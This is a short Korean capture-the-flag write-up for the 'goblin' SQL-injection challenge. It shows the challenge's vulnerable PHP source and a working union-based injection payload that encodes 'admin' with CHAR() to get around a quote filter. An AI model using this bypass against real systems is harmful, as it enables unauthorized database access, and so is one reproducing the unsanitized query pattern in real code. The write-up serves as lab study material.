# goblin

소스코드는 다음과 같다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[no])) exit("No Hack ~_~"); 
  if(preg_match('/\'|\"|\`/i', $_GET[no])) exit("No Quotes ~_~"); 
  $query = "select id from prob_goblin where id='guest' and no={$_GET[no]}"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("goblin");
  highlight_file(__FILE__); 
?>
```

`preg_match`를 보니 `quote`는 사용을 못할 것 같다. `id`가 `admin`이면 클리어가 되고, `id`는 우리가 직접 주입을 못한다. 아마도 `union based sqli`인 것 같다.

> ?no=13 union select char\(97,100,109,105,110\) `no`에 `where`이 통과되지않도록 값을 넣어주고, `union`을 통해 `admin`의 `id`를 불러 오는 방식이다.

`char(97, 100, 109, 105, 110)`은 `admin`을 뜻한다.

```sql
select id from prob_goblin where id='guest' and no=13 union select char(97,100,109,105,110)
```

이렇게 `admin`이 나와서 clear!

